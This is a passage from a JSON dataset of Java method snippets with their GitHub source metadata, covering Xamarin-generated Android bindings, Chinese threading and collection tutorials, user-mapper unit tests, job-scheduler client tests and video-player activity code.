"FormsEditText", "params": ["int", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onSelectionChanged (int p0, int p1);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsEditText.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32815, "method_name": "monodroidAddReference", "class_name": "FormsEditText", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsEditText.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32816, "method_name": "monodroidClearReferences", "class_name": "FormsEditText", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FormsEditText.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32817, "method_name": "main", "class_name": "Demo02WaitAndNotify", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u521b\u5efa\u9501\u5bf9\u8c61,\u4fdd\u8bc1\u552f\u4e00\n        Object obj = new Object();\n        // \u521b\u5efa\u4e00\u4e2a\u987e\u5ba2\u7ebf\u7a0b(\u6d88\u8d39\u8005)\n        new Thread(){\n            @Override\n            public void run() {\n                //\u4e00\u76f4\u7b49\u7740\u4e70\u5305\u5b50\n                while(true){\n                    //\u4fdd\u8bc1\u7b49\u5f85\u548c\u5524\u9192\u7684\u7ebf\u7a0b\u53ea\u80fd\u6709\u4e00\u4e2a\u6267\u884c,\u9700\u8981\u4f7f\u7528\u540c\u6b65\u6280\u672f\n                    synchronized (obj){\n                        System.out.println(\"\u987e\u5ba21\u544a\u77e5\u8001\u677f\u8981\u7684\u5305\u5b50\u7684\u79cd\u7c7b\u548c\u6570\u91cf\");\n                        //\u8c03\u7528wait\u65b9\u6cd5,\u653e\u5f03cpu\u7684\u6267\u884c,\u8fdb\u5165\u5230WAITING\u72b6\u6001(\u65e0\u9650\u7b49\u5f85)\n                        try {\n                            obj.wait();\n                        } catch (InterruptedException e) {\n                            e.printStackTrace();\n                        }\n                        //\u5524\u9192\u4e4b\u540e\u6267\u884c\u7684\u4ee3\u7801\n                        System.out.println(\"\u5305\u5b50\u5df2\u7ecf\u505a\u597d\u4e86,\u987e\u5ba21\u5f00\u5403!\");\n                        System.out.println(\"---------------------------------------\");\n                    }\n                }\n            }\n        }.start();\n\n        // \u521b\u5efa\u4e00\u4e2a\u987e\u5ba2\u7ebf\u7a0b(\u6d88\u8d39\u8005)\n        new Thread(){\n            @Override\n            public void run() {\n                //\u4e00\u76f4\u7b49\u7740\u4e70\u5305\u5b50\n                while(true){\n                    //\u4fdd\u8bc1\u7b49\u5f85\u548c\u5524\u9192\u7684\u7ebf\u7a0b\u53ea\u80fd\u6709\u4e00\u4e2a\u6267\u884c,\u9700\u8981\u4f7f\u7528\u540c\u6b65\u6280\u672f\n                    synchronized (obj){\n                        System.out.println(\"\u987e\u5ba22\u544a\u77e5\u8001\u677f\u8981\u7684\u5305\u5b50\u7684\u79cd\u7c7b\u548c\u6570\u91cf\");\n                        //\u8c03\u7528wait\u65b9\u6cd5,\u653e\u5f03cpu\u7684\u6267\u884c,\u8fdb\u5165\u5230WAITING\u72b6\u6001(\u65e0\u9650\u7b49\u5f85)\n                        try {\n                            obj.wait();\n                        } catch (InterruptedException e) {\n                            e.printStackTrace();\n                        }\n                        //\u5524\u9192\u4e4b\u540e\u6267\u884c\u7684\u4ee3\u7801\n                        System.out.println(\"\u5305\u5b50\u5df2\u7ecf\u505a\u597d\u4e86,\u987e\u5ba22\u5f00\u5403!\");\n                        System.out.println(\"---------------------------------------\");\n                    }\n                }\n            }\n        }.start();\n\n        //\u521b\u5efa\u4e00\u4e2a\u8001\u677f\u7ebf\u7a0b(\u751f\u4ea7\u8005)\n        new Thread(){\n            @Override\n            public void run() {\n                //\u4e00\u76f4\u505a\u5305\u5b50\n                while (true){\n                    //\u82b1\u4e865\u79d2\u505a\u5305\u5b50\n                    try {\n                        Thread.sleep(5000);//\u82b15\u79d2\u949f\u505a\u5305\u5b50\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n\n                    //\u4fdd\u8bc1\u7b49\u5f85\u548c\u5524\u9192\u7684\u7ebf\u7a0b\u53ea\u80fd\u6709\u4e00\u4e2a\u6267\u884c,\u9700\u8981\u4f7f\u7528\u540c\u6b65\u6280\u672f\n                    synchronized (obj){\n                        System.out.println(\"\u8001\u677f5\u79d2\u949f\u4e4b\u540e\u505a\u597d\u5305\u5b50,\u544a\u77e5\u987e\u5ba2,\u53ef\u4ee5\u5403\u5305\u5b50\u4e86\");\n                        //\u505a\u597d\u5305\u5b50\u4e4b\u540e,\u8c03\u7528notify\u65b9\u6cd5,\u5524\u9192\u987e\u5ba2\u5403\u5305\u5b50\n                        //obj.notify();//\u5982\u679c\u6709\u591a\u4e2a\u7b49\u5f85\u7ebf\u7a0b,\u968f\u673a\u5524\u9192\u4e00\u4e2a\n                        obj.notifyAll();//\u5524\u9192\u6240\u6709\u7b49\u5f85\u7684\u7ebf\u7a0b\n                    }\n                }\n            }\n        }.start();\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/17.%E3%80%90%E7%BA%BF%E7%A8%8B%E3%80%81%E5%90%8C%E6%AD%A5%E3%80%91-%E7%AC%94%E8%AE%B0/code/06_Thread/src/com/itheima/demo10/WaitAndNotify/Demo02WaitAndNotify.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32818, "method_name": "init", "class_name": "UserMapperTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        userMapper = new UserMapper();\n        user = new User();\n        user.setLogin(DEFAULT_LOGIN);\n        user.setPassword(RandomStringUtils.random(60));\n        user.setActivated(true);\n        user.setEmail(\"johndoe@localhost\");\n        user.setFirstName(\"john\");\n        user.setLastName(\"doe\");\n        user.setImageUrl(\"image_url\");\n        user.setLangKey(\"en\");\n\n        userDto = new UserDTO(user);\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/service/mapper/UserMapperTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32819, "method_name": "usersToUserDTOsShouldMapOnlyNonNullUsers", "class_name": "UserMapperTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void usersToUserDTOsShouldMapOnlyNonNullUsers() {\n        List<User> users = new ArrayList<>();\n        users.add(user);\n        users.add(null);\n\n        List<UserDTO> userDTOS = userMapper.usersToUserDTOs(users);\n\n        assertThat(userDTOS).isNotEmpty();\n        assertThat(userDTOS).size().isEqualTo(1);\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/service/mapper/UserMapperTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32820, "method_name": "userDTOsToUsersShouldMapOnlyNonNullUsers", "class_name": "UserMapperTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void userDTOsToUsersShouldMapOnlyNonNullUsers() {\n        List<UserDTO> usersDto = new ArrayList<>();\n        usersDto.add(userDto);\n        usersDto.add(null);\n\n        List<User> users = userMapper.userDTOsToUsers(usersDto);\n\n        assertThat(users).isNotEmpty();\n        assertThat(users).size().isEqualTo(1);\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/service/mapper/UserMapperTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32821, "method_name": "userDTOsToUsersWithAuthoritiesStringShouldMapToUsersWithAuthoritiesDomain", "class_name": "UserMapperTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void userDTOsToUsersWithAuthoritiesStringShouldMapToUsersWithAuthoritiesDomain() {\n        Set<String> authoritiesAsString = new HashSet<>();\n        authoritiesAsString.add(\"ADMIN\");\n        userDto.setAuthorities(authoritiesAsString);\n\n        List<UserDTO> usersDto = new ArrayList<>();\n        usersDto.add(userDto);\n\n        List<User> users = userMapper.userDTOsToUsers(usersDto);\n\n        assertThat(users).isNotEmpty();\n        assertThat(users).size().isEqualTo(1);\n        assertThat(users.get(0).getAuthorities()).isNotNull();\n        assertThat(users.get(0).getAuthorities()).isNotEmpty();\n        assertThat(users.get(0).getAuthorities().iterator().next().getName()).isEqualTo(\"ADMIN\");\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/service/mapper/UserMapperTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32822, "method_name": "userDTOsToUsersMapWithNullAuthoritiesStringShouldReturnUserWithEmptyAuthorities", "class_name": "UserMapperTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void userDTOsToUsersMapWithNullAuthoritiesStringShouldReturnUserWithEmptyAuthorities() {\n        userDto.setAuthorities(null);\n\n        List<UserDTO> usersDto = new ArrayList<>();\n        usersDto.add(userDto);\n\n        List<User> users = userMapper.userDTOsToUsers(usersDto);\n\n        assertThat(users).isNotEmpty();\n        assertThat(users).size().isEqualTo(1);\n        assertThat(users.get(0).getAuthorities()).isNotNull();\n        assertThat(users.get(0).getAuthorities()).isEmpty();\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/service/mapper/UserMapperTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32823, "method_name": "userDTOToUserMapWithAuthoritiesStringShouldReturnUserWithAuthorities", "class_name": "UserMapperTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void userDTOToUserMapWithAuthoritiesStringShouldReturnUserWithAuthorities() {\n        Set<String> authoritiesAsString = new HashSet<>();\n        authoritiesAsString.add(\"ADMIN\");\n        userDto.setAuthorities(authoritiesAsString);\n\n        User user = userMapper.userDTOToUser(userDto);\n\n        assertThat(user).isNotNull();\n        assertThat(user.getAuthorities()).isNotNull();\n        assertThat(user.getAuthorities()).isNotEmpty();\n        assertThat(user.getAuthorities().iterator().next().getName()).isEqualTo(\"ADMIN\");\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/service/mapper/UserMapperTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32824, "method_name": "userDTOToUserMapWithNullAuthoritiesStringShouldReturnUserWithEmptyAuthorities", "class_name": "UserMapperTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void userDTOToUserMapWithNullAuthoritiesStringShouldReturnUserWithEmptyAuthorities() {\n        userDto.setAuthorities(null);\n\n        User user = userMapper.userDTOToUser(userDto);\n\n        assertThat(user).isNotNull();\n        assertThat(user.getAuthorities()).isNotNull();\n        assertThat(user.getAuthorities()).isEmpty();\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/service/mapper/UserMapperTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32825, "method_name": "userDTOToUserMapWithNullUserShouldReturnNull", "class_name": "UserMapperTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void userDTOToUserMapWithNullUserShouldReturnNull() {\n        assertThat(userMapper.userDTOToUser(null)).isNull();\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/service/mapper/UserMapperTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32826, "method_name": "testUserFromId", "class_name": "UserMapperTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void testUserFromId() {\n        assertThat(userMapper.userFromId(DEFAULT_ID).getId()).isEqualTo(DEFAULT_ID);\n        assertThat(userMapper.userFromId(null)).isNull();\n    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/service/mapper/UserMapperTest.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32827, "method_name": "callback", "class_name": "AdminBizTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void callback() throws Exception {\n        AdminBiz adminBiz = new AdminBizClient(addressUrl, accessToken);\n\n        HandleCallbackParam param = new HandleCallbackParam();\n        param.setLogId(1);\n        param.setExecuteResult(ReturnT.SUCCESS);\n\n        List<HandleCallbackParam> callbackParamList = Arrays.asList(param);\n\n        ReturnT<String> returnT = adminBiz.callback(callbackParamList);\n\n        Assert.assertTrue(returnT.getCode() == ReturnT.SUCCESS_CODE);\n    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/test/java/com/xxl/job/adminbiz/AdminBizTest.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32828, "method_name": "registry", "class_name": "AdminBizTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void registry() throws Exception {\n        AdminBiz adminBiz = new AdminBizClient(addressUrl, accessToken);\n\n        RegistryParam registryParam = new RegistryParam(RegistryConfig.RegistType.EXECUTOR.name(), \"xxl-job-executor-example\", \"127.0.0.1:9999\");\n        ReturnT<String> returnT = adminBiz.registry(registryParam);\n\n        Assert.assertTrue(returnT.getCode() == ReturnT.SUCCESS_CODE);\n    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/test/java/com/xxl/job/adminbiz/AdminBizTest.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32829, "method_name": "registryRemove", "class_name": "AdminBizTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void registryRemove() throws Exception {\n        AdminBiz adminBiz = new AdminBizClient(addressUrl, accessToken);\n\n        RegistryParam registryParam = new RegistryParam(RegistryConfig.RegistType.EXECUTOR.name(), \"xxl-job-executor-example\", \"127.0.0.1:9999\");\n        ReturnT<String> returnT = adminBiz.registryRemove(registryParam);\n\n        Assert.assertTrue(returnT.getCode() == ReturnT.SUCCESS_CODE);\n\n    }", "url": "https://raw.githubusercontent.com/miaoo92/xxl-job-mongo/master/src/test/java/com/xxl/job/adminbiz/AdminBizTest.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32830, "method_name": "main", "class_name": "Demo02KeySet", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u521b\u5efaMap\u96c6\u5408\u5bf9\u8c61\n        Map<String,Integer> map = new HashMap<>();\n        map.put(\"\u8d75\u4e3d\u9896\",168);\n        map.put(\"\u6768\u9896\",165);\n        map.put(\"\u6797\u5fd7\u73b2\",178);\n\n        //1.\u4f7f\u7528Map\u96c6\u5408\u4e2d\u7684\u65b9\u6cd5keySet(),\u628aMap\u96c6\u5408\u6240\u6709\u7684key\u53d6\u51fa\u6765,\u5b58\u50a8\u5230\u4e00\u4e2aSet\u96c6\u5408\u4e2d\n        Set<String> set = map.keySet();\n\n        //2.\u904d\u5386set\u96c6\u5408,\u83b7\u53d6Map\u96c6\u5408\u4e2d\u7684\u6bcf\u4e00\u4e2akey\n        //\u4f7f\u7528\u8fed\u4ee3\u5668\u904d\u5386Set\u96c6\u5408\n        Iterator<String> it = set.iterator();\n        while (it.hasNext()){\n            String key = it.next();\n            //3.\u901a\u8fc7Map\u96c6\u5408\u4e2d\u7684\u65b9\u6cd5get(key),\u901a\u8fc7key\u627e\u5230value\n            Integer value = map.get(key);\n            System.out.println(key+\"=\"+value);\n        }\n        System.out.println(\"-------------------\");\n        //\u4f7f\u7528\u589e\u5f3afor\u904d\u5386Set\u96c6\u5408\n        for(String key : set){\n            //3.\u901a\u8fc7Map\u96c6\u5408\u4e2d\u7684\u65b9\u6cd5get(key),\u901a\u8fc7key\u627e\u5230value\n            Integer value = map.get(key);\n            System.out.println(key+\"=\"+value);\n        }\n        System.out.println(\"-------------------\");\n        //\u4f7f\u7528\u589e\u5f3afor\u904d\u5386Set\u96c6\u5408\n        for(String key : map.keySet()){\n            //3.\u901a\u8fc7Map\u96c6\u5408\u4e2d\u7684\u65b9\u6cd5get(key),\u901a\u8fc7key\u627e\u5230value\n            Integer value = map.get(key);\n            System.out.println(key+\"=\"+value);\n        }\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/15.%E3%80%90Map%E3%80%91-%E7%AC%94%E8%AE%B0/code/04_Map/src/com/itheima/demo01/Map/Demo02KeySet(1).java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32831, "method_name": "onCreate", "class_name": "DetailMoreTypeActivity", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_detail_more_type);\n        ButterKnife.bind(this);\n\n        String source1 = \"http://9890.vod.myqcloud.com/9890_4e292f9a3dd011e6b4078980237cc3d3.f20.mp4\";\n        //String source1 = \"https://res.exexm.com/cw_145225549855002\";\n        String name = \"\u666e\u901a\";\n        SwitchVideoModel switchVideoModel = new SwitchVideoModel(name, source1);\n\n        String source2 = \"http://9890.vod.myqcloud.com/9890_4e292f9a3dd011e6b4078980237cc3d3.f30.mp4\";\n        String name2 = \"\u6e05\u6670\";\n        SwitchVideoModel switchVideoModel2 = new SwitchVideoModel(name2, source2);\n\n        List<SwitchVideoModel> list = new ArrayList<>();\n        list.add(switchVideoModel);\n        list.add(switchVideoModel2);\n\n        detailPlayer.setUp(list, true, \"\");\n\n        //\u589e\u52a0\u5c01\u9762\n        coverImageView = new ImageView(this);\n        coverImageView.setScaleType(ImageView.ScaleType.CENTER_CROP);\n        //coverImageView.setImageResource(R.mipmap.xxx1);\n        detailPlayer.setThumbImageView(coverImageView);\n\n        resolveNormalVideoUI();\n\n        //\u5916\u90e8\u8f85\u52a9\u7684\u65cb\u8f6c\uff0c\u5e2e\u52a9\u5168\u5c4f\n        orientationUtils = new OrientationUtils(this, detailPlayer);\n        //\u521d\u59cb\u5316\u4e0d\u6253\u5f00\u5916\u90e8\u7684\u65cb\u8f6c\n        orientationUtils.setEnable(false);\n\n        detailPlayer.setIsTouchWiget(true);\n        //detailPlayer.setIsTouchWigetFull(false);\n        //\u5173\u95ed\u81ea\u52a8\u65cb\u8f6c\n        detailPlayer.setRotateViewAuto(false);\n        detailPlayer.setLockLand(false);\n\n        //\u6253\u5f00  \u5b9e\u73b0\u7ad6\u5c4f\u5168\u5c4f\u52a8\u753b\n        detailPlayer.setShowFullAnimation(true);\n\n        detailPlayer.setNeedLockFull(true);\n        detailPlayer.setSeekRatio(1);\n        //detailPlayer.setOpenPreView(false);\n        detailPlayer.getFullscreenButton().setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                //\u5c4f\u853d\uff0c\u5b9e\u73b0\u7ad6\u5c4f\u5168\u5c4f\n                //orientationUtils.resolveByClick();\n\n                //\u7b2c\u4e00\u4e2atrue\u662f\u5426\u9700\u8981\u9690\u85cfactionbar\uff0c\u7b2c\u4e8c\u4e2atrue\u662f\u5426\u9700\u8981\u9690\u85cfstatusbar\n                detailPlayer.startWindowFullscreen(DetailMoreTypeActivity.this, true, true);\n            }\n        });\n\n        detailPlayer.setVideoAllCallBack(new GSYSampleCallBack() {\n            @Override\n            public void onPrepared(String url, Object... objects) {\n                super.onPrepared(url, objects);\n                //\u5f00\u59cb\u64ad\u653e\u4e86\u624d\u80fd\u65cb\u8f6c\u548c\u5168\u5c4f\n                //orientationUtils.setEnable(true);\n                orientationUtils.setEnable(false);\n                isPlay = true;\n            }\n\n            @Override\n            public void onAutoComplete(String url, Object... objects) {\n                super.onAutoComplete(url, objects);\n            }\n\n            @Override\n            public void onClickStartError(String url, Object... objects) {\n                super.onClickStartError(url, objects);\n            }\n\n            @Override\n            public void onQuitFullscreen(String url, Object... objects) {\n                super.onQuitFullscreen(url, objects);\n                //\u5c4f\u853d\uff0c\u5b9e\u73b0\u7ad6\u5c4f\u5168\u5c4f\n                //if (orientationUtils != null) {\n                    //orientationUtils.backToProtVideo();\n                //}\n            }\n        });\n\n        detailPlayer.setLockClickListener(new LockClickListener() {\n            @Override\n            public void onClick(View view, boolean lock) {\n                //\u5c4f\u853d\uff0c\u5b9e\u73b0\u7ad6\u5c4f\u5168\u5c4f\n                //if (orientationUtils != null) {\n                    //\u914d\u5408\u4e0b\u65b9\u7684onConfigurationChanged\n                    //orientationUtils.setEnable(!lock);\n                //}\n            }\n        });\n\n        loadFirstFrameCover(source1);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailMoreTypeActivity.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 32832, "method_name": "onBackPressed", "class_name": "DetailMoreTypeActivity", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBackPressed() {\n\n        if (orientationUtils != null) {\n            orientationUtils.backToProtVideo();\n        }\n\n        if (GSYVideoManager.backFromWindowFull(this)) {\n            return;\n        }\n        super.onBackPressed();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailMoreTypeActivity.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 32833, "method_name": "onPause", "class_name": "DetailMoreTypeActivity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onPause() {\n        getCurPlay().onVideoPause();\n        super.onPause();\n        isPause = true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailMoreTypeActivity.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 32834, "method_name": "onResume", "class_name": "DetailMoreTypeActivity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onResume() {\n        getCurPlay().onVideoResume();\n        super.onResume();\n        isPause = false;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailMoreTypeActivity.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 32835, "method_name": "onDestroy", "class_name": "DetailMoreTypeActivity", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDestroy() {\n        super.onDestroy();\n        isRelease = true;\n        if (isPlay) {\n            getCurPlay().release();\n        }\n        //GSYPreViewManager.instance().releaseMediaPlayer();\n        if (orientationUtils != null)\n            orientationUtils.releaseListener();\n        if (mCoverMedia != null) {\n            mCoverMedia.release();\n            mCoverMedia = null;\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailMoreTypeActivity.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 32836, "method_name": "onConfigurationChanged", "class_name": "DetailMoreTypeActivity", "params": ["Configuration"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onConfigurationChanged(Configuration newConfig) {\n        super.onConfigurationChanged(newConfig);\n        //\u5982\u679c\u65cb\u8f6c\u4e86\u5c31\u5168\u5c4f\n        if (isPlay && !isPause) {\n            detailPlayer.onConfigurationChanged(this, newConfig, orientationUtils, true, true);\n        }\n        //\u7ad6\u5c4f\u5168\u5c4f\n        orientationUtils.setEnable(false);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailMoreTypeActivity.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 32837, "method_name": "getCurPlay", "class_name": "DetailMoreTypeActivity", "params": [], "throws": null, "modifiers": ["private"], "return_type": "GSYVideoPlayer", "snippet": "    private GSYVideoPlayer getCurPlay() {\n        if (detailPlayer.getFullWindowPlayer() != null) {\n            return  detailPlayer.getFullWindowPlayer();\n        }\n        return detailPlayer;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailMoreTypeActivity.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 32838, "method_name": "resolveNormalVideoUI", "class_name": "DetailMoreTypeActivity", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resolveNormalVideoUI() {\n        //\u589e\u52a0title\n        detailPlayer.getTitleTextView().setVisibility(View.GONE);\n        detailPlayer.getBackButton().setVisibility(View.GONE);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailMoreTypeActivity.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 32839, "method_name": "loadFirstFrameCover", "class_name": "DetailMoreTypeActivity", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void loadFirstFrameCover(String url) {\n\n        //\u539f\u59cb\u65b9\u6cd5\n        /*final MediaMetadataRetriever mediaMetadataRetriever = getMediaMetadataRetriever(url);\n        //\u83b7\u53d6\u5e27\u56fe\u7247\n        if (getMediaMetadataRetriever(url) != null) {\n            new Thread(new Runnable() {\n                @Override\n                public void run() {\n                    final Bitmap bitmap = mediaMetadataRetriever\n                            .getFrameAtTime(1000, MediaMetadataRetriever.OPTION_CLOSEST);\n                    runOnUiThread(new Runnable() {\n                        @Override\n                        public void run() {\n                            if (bitmap != null && !isRelease) {\n                                Debuger.printfLog(\"time \" + System.currentTimeMillis());\n                                //\u663e\u793a\n                                coverImageView.setImageBitmap(bitmap);\n                            }\n                        }\n                    });\n                }\n            }).start();\n        }*/\n\n        //\u53ef\u4ee5\u53c2\u8003Glide\uff0c\u5185\u90e8\u4e5f\u662f\u5c01\u88c5\u4e86MediaMetadataRetriever\n        Glide.with(this.getApplicationContext())\n                .setDefaultRequestOptions(\n                        new RequestOptions()\n                                .frame(1000000)\n                                .centerCrop()\n                                .error(R.mipmap.xxx2)\n                                .placeholder(R.mipmap.xxx1))\n                .load(url)\n                .into(coverImageView);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailMoreTypeActivity.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 32840, "method_name": "getMediaMetadataRetriever", "class_name": "DetailMoreTypeActivity", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "MediaMetadataRetriever", "snippet": "    public MediaMetadataRetriever getMediaMetadataRetriever(String url) {\n        if (mCoverMedia == null) {\n            mCoverMedia = new MediaMetadataRetriever();\n        }\n        mCoverMedia.setDataSource(url, new HashMap<String, String>());\n        return mCoverMedia;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/DetailMoreTypeActivity.java", "stars": "2", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 32841, "method_name": "monodroidAddReference", "class_name": "GroupableItemsViewRenderer_3", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/GroupableItemsViewRenderer_3.java", "stars": "2", "class_props": {"extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32842, "method_name": "monodroidClearReferences", "class_name": "GroupableItemsViewRenderer_3", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList 